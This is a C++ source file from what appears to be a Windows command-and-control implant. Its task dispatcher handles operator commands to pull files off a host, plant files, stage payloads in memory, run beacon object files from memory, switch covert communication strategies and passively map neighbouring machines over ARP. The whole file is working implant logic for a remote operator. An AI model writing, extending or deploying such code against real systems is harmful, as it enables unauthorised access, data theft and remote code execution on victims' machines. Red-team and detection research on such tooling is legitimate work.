/*

Command tree


...
results methodology:

message: A message for the operator. This is either a direct output from windows `FormatMessageA`, or something else if not using windows api.
data: This holds the data output of the action. Ex, `ls`, data will hold the file list. 
    > note, more specific fields may be included, such as `comms_get_strategy`, and `comms_post_strategy`, when multiple fields are needed.
    > These should be documented (somewhere...) by me eventually. By default, the GUI spits all response fields out into the terminal.

windows_error_code: A windows error code to always include (even 0, on success). Helfpul for knowing whaat went wrong/passing through
errors without relying on addtl branch logic. I try to use windows error  macro defs where possible (ex, ERROR_SUCCESS).
    
*/


#include "../protocols/json/json.h"
#include <iostream>
#include "../modules/cd.h"
#include "../modules/ls.h"
#include "../modules/files.h"
#include "../modules/bof.h"
#include "../modules/discover.h"
#include "../data/msgpack/msgpack.h"
#include "settings.h"
#include "../data/structs.h"
#include "../systems/memstore.h"
#include <string_view>
#include <windows.h>
#include <string>
//move to own file?
std::string GetErrorMessage(DWORD dwErrorCode) {
    if (dwErrorCode == ERROR_SUCCESS) {
        return "Success";
    }

    LPSTR messageBuffer = nullptr;

    // Ask Windows to find the message and allocate the required memory
    size_t size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dwErrorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&messageBuffer,
        0,
        NULL
    );

    // Copy the message into a std::string
    std::string message(messageBuffer, size);

    // Free the buffer allocated by the system
    LocalFree(messageBuffer);

    //clean up windows stuff
    //if (!message.empty() && message.back() == '\n') message.pop_back();
    //if (!message.empty() && message.back() == '\r') message.pop_back();

    return message;
}

//Helpers
std::vector<uint8_t> deref_memstore_content(std::string memstore_name_with_deref_symbol) {
    //nuke the `*` from the memstore name
    //ex, *mydata -> mydata
    memstore_name_with_deref_symbol.erase(0, 1);

    //sanity check to make sure the name is not empty for some reason
    if (memstore_name_with_deref_symbol.empty()) {
        //reutrn a blank vector if the name is blank
        return std::vector <uint8_t> {};
    }

    //get memstore data
    std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_name_with_deref_symbol);

    return memstore_file_bytes;
}

std::vector<uint8_t> determine_if_argument_is_data_or_memstore_pointer(const nlohmann::json& element) {
    // Case 1: Raw Binary (Standard)
    if (element.is_binary()) {
        return element.get_binary();
    }

    // Case 2: String (Could be text or a pointer)
    if (element.is_string()) {
        std::string s = element.get<std::string>();

        // Check for MemStore Pointer (*key)
        if (!s.empty() && s[0] == '*') {
            return deref_memstore_content(s);
        }
    }
    //return blank vector if nothing?
    return {};
}
// ==

//take in the mapped object, after converted from msgpack
//all command splitting/overhead logic is done here, then passed to the appropriate modules
nlohmann::json command_tree(nlohmann::json task_data) {
    //Note, if ever a vector of tasks, do a for loop over said vector here - or have caller call command_tree multiple times. both are fair options. 
    std::string task_name = task_data["task"]["task_name"];
    //basic checks for the task. 
    if (task_name.empty()) {
        nlohmann::json result;
        add_int_result(result, "windows_error_code", ERROR_INVALID_PARAMETER);
        add_text_result(result, "message", GetErrorMessage(ERROR_INVALID_PARAMETER));
        add_text_result(result, "data", "");
        return result;
    }
    /*
    Strat commands
    */
    if (task_name == "strat get") {
        nlohmann::json result;

        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
        std::string comms_get_function = task_data["task"]["args"]["strategy_name"];
        
        SettingsManager::instance().set("comms_get_function", comms_get_function);

        add_text_result(result, "data", comms_get_function);
        //hardcode success, as this is not a module
        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
        add_int_result(result, "windows_error_code", ERROR_SUCCESS);

        return result;
    }
    else if (task_name == "strat post") {
        nlohmann::json result;

        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
        std::string comms_post_function = task_data["task"]["args"]["strategy_name"];
        
        SettingsManager::instance().set("comms_post_function", comms_post_function);

        add_text_result(result, "data", comms_post_function);
        //hardcode success, as this is not a module
        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
        add_int_result(result, "windows_error_code", ERROR_SUCCESS);

        return result;
    }
    else if (task_name == "strat list") {
        nlohmann::json result;

        std::string output = "";

        //move me to strat.cpp or something, this is just a placeholder to show the concept.
        std::map<std::string, IngressFunc> get_map = SettingsManager::instance().get<std::map<std::string, IngressFunc>>("comms_get_strat_map", {});
        std::map<std::string, EgressFunc> post_map = SettingsManager::instance().get<std::map<std::string, EgressFunc>>("comms_post_strat_map", {});

        // Loop through Ingress Map
        for (const auto& [name, func] : get_map) {
            output += name + "\n";
        }

        // Loop through Egress Map
        for (const auto& [name, func] : post_map) {
            output += name + "\n";
        }

        add_text_result(result, "data", output);
        //hardcode data response, these do not have the saem req's as modules, as they aren't modules. 
        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
        add_int_result(result, "windows_error_code", ERROR_SUCCESS);

        return result;
    }
    else if (task_name == "strat active") {
        nlohmann::json result;

        std::string get_strategy = SettingsManager::instance().get<std::string>("comms_get_function", "");
        std::string post_strategy = SettingsManager::instance().get<std::string>("comms_post_function", "");

        //hardcode data response, these do not have the saem req's as modules, as they aren't modules. 
        //note - this may move to a settings option later. 
        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
        add_text_result(result, "data", "");

        add_text_result(result, "comms_get_strategy", get_strategy);
        add_text_result(result, "comms_post_strategy", post_strategy);

        return result;
    }
    /*
    System/Systems commands
    For now, have hardcoded message, data, and windows_error_code. Not module based
    */
    else if (task_name == "exit") {
        //no return, just kill it
        //maybe move me to a module later for different shutdown options
        exit(0);
    }
    else if (task_name == "sleep") {
        nlohmann::json result;

        //should be an int, should prolly do some error handling here, but for now, just assume the user is giving us good data.
        int sleep_time = task_data["task"]["args"]["sleep_time"];
        
        SettingsManager::instance().set("sleep_time", sleep_time);

        //add_text_result(result, "message", "Sleep set to: " + std::to_string(sleep_time));
        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
        add_text_result(result, "data", std::to_string(sleep_time));
        add_int_result(result, "windows_error_code", ERROR_SUCCESS);

        return result;
    }

    else if (task_name == "memstore upload") {
        nlohmann::json result;

        auto& args = task_data["task"]["args"];
        if (!args.contains("file_contents") || !args["file_contents"].is_binary()) {
            add_text_result(result, "error", "Task failed: 'file_contents' is missing or not binary.");
            return result;
        }
        if (!args.contains("file_name") || !args["file_name"].is_string()) {
            add_text_result(result, "error", "Task failed: 'file_name' is missing or not a string.");
            return result;
        }

        std::string file_name = task_data["task"]["args"]["file_name"];

        //get element
        auto& json_element = task_data["task"]["args"]["file_contents"];
        //turn into bytes, tldr, need to call get_binary from nholmann json to get proper bin data
        std::vector<uint8_t> file_bytes;
        file_bytes = json_element.get_binary();

        int windows_error_code = MemStore::instance().store(file_name, file_bytes);

        //store does not have a return type/good way to check success yet, for now, assuming it was successful
        //could do a "num of items before, then add, and if items = items +1"
        add_text_result(result, "message", GetErrorMessage(windows_error_code));
        add_int_result(result, "windows_error_code", windows_error_code);
        //hardcode data response, memstore does not have same returns as modules,  as it's not a module
        add_text_result(result, "data", "");
        return result;


    }
    else if (task_name == "memstore download") {
        nlohmann::json result;

        auto& args = task_data["task"]["args"];
        if (!args.contains("file_name") || !args["file_name"].is_string()) {
            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
            return result;
        }

        std::string memstore_file_to_download = task_data["task"]["args"]["file_name"];

        std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_file_to_download);

        add_bytes_result(result, "data", memstore_file_bytes);
        //hardcode response, memstore does not have same return values as modules, as it's not a module
        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
        return result;
    }
    else if (task_name == "memstore delete") {
        nlohmann::json result;

        //check for correct values
        auto& args = task_data["task"]["args"];
        if (!args.contains("file_name") || !args["file_name"].is_string()) {
            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
            return result;
        }

        std::string memstore_file_to_remove = task_data["task"]["args"]["file_name"];

        int windows_error_code = MemStore::instance().remove(memstore_file_to_remove);
        add_text_result(result, "message", GetErrorMessage(windows_error_code));
        add_int_result(result, "windows_error_code", windows_error_code);
        //hardcode data field, memstore does not have same requirements as modules,  as it's not a module
        add_text_result(result, "data", "");
        return result;


    }
    else if (task_name == "memstore clear") {
        nlohmann::json result;

        //currently always returns success
        int windows_error_code = MemStore::instance().clear();

        add_text_result(result, "message", GetErrorMessage(windows_error_code));
        add_int_result(result, "windows_error_code", windows_error_code);
        //hardcode data response, memstore does not have same response req's as modules,  as it's not a module
        add_text_result(result, "data", "");
        return result;

    }
    else if (task_name == "memstore list") {
        nlohmann::json result;

        std::vector<std::string> file_names = MemStore::instance().get_file_names();

        std::string output;
        for (std::string file_name : file_names) {
            output += file_name;
            output += "\n";
        }

        //std::cout << output << std::endl;

        add_text_result(result, "data", output);
        //hardcode response, memstore does not have same return values as modules,  as it's not a module
        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));

        return result;
    }
    /*
    Modules
    Note: return values are directly pulled from modules, message, data and windows_error_code
    */
    else if (task_name == "ls") {
        nlohmann::json result;
        //get args, which are named compontents in the task->args block of the task_data
        std::string directory_to_list = task_data["task"]["args"]["directory"];
        //do a validation here

        //If for whatever reason, there is a blank directory, fallback to current directory. This is checked on the Client as well,but an "ls" may slip through without a dir on via the API.
        if (directory_to_list.empty()) {
            directory_to_list = "."; //set to current dir if no directory is provided
        }

        ModuleResult module_result = ls(directory_to_list);
        std::string files_list = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        add_text_result(result, "message", GetErrorMessage(windows_error_code));
        add_int_result(result, "windows_error_code", windows_error_code);
        add_text_result(result, "data", files_list);
        

        return result;
    }
    else if (task_name == "cd") {
        //std::string temp_path = "C:\\";

        //get args, which are named compontents in the task->args block of the task_data
        std::string directory_to_traverse_to = task_data["task"]["args"]["directory"];
        //do a validation here
        
        //setup json object to return. This will be plugged into the result. 
        nlohmann::json result;


        ModuleResult module_result = cd(directory_to_traverse_to);
        std::string data = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        add_text_result(result, "data", data);
        add_text_result(result, "message", GetErrorMessage(windows_error_code));
        add_int_result(result, "windows_error_code", windows_error_code);

        return result;

    }
    else if (task_name == "file download") {
        nlohmann::json result;

        //check for correct values
        auto& args = task_data["task"]["args"];
        if (!args.contains("file_path") || !args["file_path"].is_string()) {
            add_text_result(result, "error", "Task failed: 'file_path' is missing or not a string.");
            return result;
        }

        //get file path from command
        std::string file_path = task_data["task"]["args"]["file_path"];

        //std::string file_contents = get_file(file_path);
        ModuleResult module_result = get_file(file_path);
        std::string file_contents = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        if (file_contents.empty()) {
            add_text_result(result, "message", "File appears to be empty");
            add_int_result(result, "windows_error_code", static_cast<int>(windows_error_code)); //dword -> int
            return result;

        }

        add_text_result(result, "message", GetErrorMessage(windows_error_code));
        add_int_result(result, "windows_error_code", windows_error_code);
        add_bytes_result(result, "data", file_contents);

        return result;
    }
    else if (task_name == "file upload") {
        nlohmann::json result;

        //check for correct values
        auto& args = task_data["task"]["args"];

        // 1. Validate Inputs
        if (!args.contains("file_path") || !args.contains("file_contents")) {
            throw std::runtime_error("Missing required arguments: file_path or file_contents");
        }

        // Extract Data 
        std::string file_path = args["file_path"];
        std::vector<uint8_t> file_bytes = determine_if_argument_is_data_or_memstore_pointer(args["file_contents"]);

        // sanity check to make sure that the vector is not empty.
        if (file_bytes.empty()) {
            add_text_result(result, "error", "File content was empty (or invalid pointer). Wrote 0 bytes.");
            return result;
        }

        ModuleResult module_result = put_file(file_bytes, file_path);
        std::string data = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        add_text_result(result, "message", GetErrorMessage(windows_error_code));
        add_int_result(result, "windows_error_code", windows_error_code);
        add_text_result(result, "data", data);

        return result;
    }
    else if (task_name == "bof") {
        nlohmann::json result;

        //check for correct values
        auto& args = task_data["task"]["args"];

        // Validate Inputs
        if (!args.contains("bof_contents") || !args.contains("bof_args")) {
            //throw std::runtime_error("Missing required arguments: bof_contents, bof_args");
            add_text_result(result, "error", "Missing bof_contents or bof_args");
            return result;
        }

        // Extract Data 
        std::string bof_args = args["bof_args"];
        std::vector<uint8_t> bof_bytes = determine_if_argument_is_data_or_memstore_pointer(args["bof_contents"]);

        // sanity check to make sure that the vector is not empty.
        if (bof_bytes.empty()) {
            add_text_result(result, "error", "bof content was empty (or invalid pointer).");
            return result;
        }

        ModuleResult module_result = run_bof(bof_bytes, bof_args);
        std::string data = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        add_text_result(result, "message", GetErrorMessage(windows_error_code));
        add_int_result(result, "windows_error_code", windows_error_code);
        add_text_result(result, "data", data);

        return result;
    }
    else if (task_name == "discover neighbors") {
        nlohmann::json result;

        ModuleResult module_result = passive_arp_discovery();
        std::string data = module_result.data;
        DWORD windows_error_code = module_result.windows_error_code;

        add_text_result(result, "message", GetErrorMessage(windows_error_code));
        add_int_result(result, "windows_error_code", windows_error_code);
        add_text_result(result, "data", data);
        return result;
    }
    else {
        nlohmann::json result;
        add_int_result(result, "windows_error_code", ERROR_INVALID_PARAMETER);
        add_text_result(result, "message", GetErrorMessage(ERROR_INVALID_PARAMETER));
        add_text_result(result, "data", "");

        return result;
    }

}

//placeholder for  a beacon printf style func?
int send_to_server(std::string output) {
    std::cout << output << std::endl;
    return 0;
}